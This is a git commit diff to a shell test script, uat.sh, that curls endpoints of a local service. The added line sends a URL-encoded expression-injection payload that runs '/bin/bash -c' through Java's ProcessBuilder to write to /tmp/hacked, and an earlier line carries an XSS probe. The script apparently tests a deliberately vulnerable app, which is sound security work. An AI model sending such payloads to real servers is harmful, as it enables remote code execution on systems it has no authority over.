706ba2051bc7d6c81d274d6d2e8aa4b7d8414460
Alok Shukla <32108973+alokshukla1978@users.noreply.github.com>
2018-10-19 15:32:02 -0700

    Update uat.sh

--- uat.sh
+++ uat.sh
@@ -6,4 +6,5 @@ curl http://localhost:8081/patients
 curl http://localhost:8081/account
 curl http://localhost:8081/account/1
 curl "http://localhost:8081/debug?customerId=1&clientId=1&firstName=a&lastName=b&dateOfBirth=123&ssn=123&socialSecurityNum=1&tin=123&phoneNumber=5432alert(1)"
+curl -X GET http://localhost:8081/search/user\?foo\=new%20java.lang.ProcessBuilder\(%7B%27%2Fbin%2Fbash%27%2C%27-c%27%2C%27echo%203vilhax0r%3E%2Ftmp%2Fhacked%27%7D\).start\(\)
 sleep 20
